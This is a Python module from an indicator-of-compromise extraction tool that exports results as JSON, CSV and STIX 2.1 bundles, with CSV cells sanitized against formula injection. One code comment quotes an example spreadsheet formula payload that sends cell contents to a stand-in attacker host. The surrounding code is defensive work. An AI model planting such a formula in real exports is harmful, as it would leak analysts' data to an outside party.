"""Adapters that serialize an ExtractionResult to various output formats."""

from __future__ import annotations

import csv
import io
import json
import uuid
from typing import Any

from ioc_extractor.core.models import ExtractionResult

# Minimal mapping from our internal IOCType to STIX 2.1 indicator patterns.
_STIX_PATTERN_KEY = {
    "ipv4": "ipv4-addr:value",
    "ipv6": "ipv6-addr:value",
    "domain": "domain-name:value",
    "url": "url:value",
    "email": "email-addr:value",
    "md5": "file:hashes.'MD5'",
    "sha1": "file:hashes.'SHA-1'",
    "sha256": "file:hashes.'SHA-256'",
    "sha512": "file:hashes.'SHA-512'",
}

# Leading characters that Excel, Google Sheets, and LibreOffice Calc treat
# as the start of a formula. Since `context` (and occasionally `value`, for
# types like FILE_PATH) is derived from attacker-controlled report text,
# writing it to CSV unmodified is a CSV/formula-injection vector (CWE-1236):
# a crafted report could embed a payload such as
# `=HYPERLINK("http://evil.example/steal?d="&A1)` that executes when an
# analyst opens the exported CSV in a spreadsheet application.
_FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@", "\t", "\r")


def _sanitize_csv_cell(value: str) -> str:
    """Prefix a cell with a single quote if it could be parsed as a formula."""
    if value.startswith(_FORMULA_TRIGGER_CHARS):
        return f"'{value}"
    return value


def to_json(result: ExtractionResult, *, indent: int = 2) -> str:
    """Serialize a result to a JSON document."""
    payload: dict[str, Any] = {
        "source": result.source,
        "summary": result.summary(),
        "iocs": [
            {
                "value": ioc.value,
                "type": ioc.ioc_type.value,
                "raw": ioc.raw,
                "was_defanged": ioc.was_defanged,
                "context": ioc.context,
            }
            for ioc in result.iocs
        ],
    }
    return json.dumps(payload, indent=indent)


def to_csv(result: ExtractionResult) -> str:
    """Serialize a result to CSV text with columns: type,value,defanged,context.

    Cell values are sanitized against CSV/formula injection (CWE-1236)
    before being written — see :func:`_sanitize_csv_cell`.
    """
    buf = io.StringIO()
    writer = csv.writer(buf)
    writer.writerow(["type", "value", "was_defanged", "context"])
    for ioc in result.iocs:
        writer.writerow(
            [
                ioc.ioc_type.value,
                _sanitize_csv_cell(ioc.value),
                ioc.was_defanged,
                _sanitize_csv_cell(ioc.context),
            ]
        )
    return buf.getvalue()


def to_stix_bundle(result: ExtractionResult) -> str:
    """Serialize a result to a minimal STIX 2.1 Bundle of Indicator objects.

    This is a lightweight, dependency-free STIX emitter intended for
    interoperability with SIEM/TIP ingestion pipelines. It is not a full
    STIX validation layer.
    """
    objects: list[dict[str, Any]] = []
    for ioc in result.iocs:
        stix_key = _STIX_PATTERN_KEY.get(ioc.ioc_type.value)
        if stix_key is None:
            continue
        escaped_value = ioc.value.replace("\\", "\\\\").replace("'", "\\'")
        objects.append(
            {
                "type": "indicator",
                "spec_version": "2.1",
                "id": f"indicator--{uuid.uuid4()}",
                "pattern": f"[{stix_key} = '{escaped_value}']",
                "pattern_type": "stix",
                "created_by_ref": "identity--ioc-extractor",
                "labels": [ioc.ioc_type.value],
            }
        )

    bundle = {
        "type": "bundle",
        "id": f"bundle--{uuid.uuid4()}",
        "objects": objects,
    }
    return json.dumps(bundle, indent=2)
